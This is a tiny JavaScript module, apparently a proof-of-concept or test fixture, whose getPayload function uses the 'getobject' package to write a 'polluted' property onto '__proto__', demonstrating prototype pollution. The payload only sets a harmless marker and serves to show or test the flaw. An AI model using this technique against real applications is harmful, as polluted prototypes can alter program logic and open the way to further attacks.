function getPayload() {
    const getObject = require("getobject");
    var obj = {};

    getObject.set(obj, "__proto__.polluted", "yes");

    return { obj };
}

module.exports = { getPayload };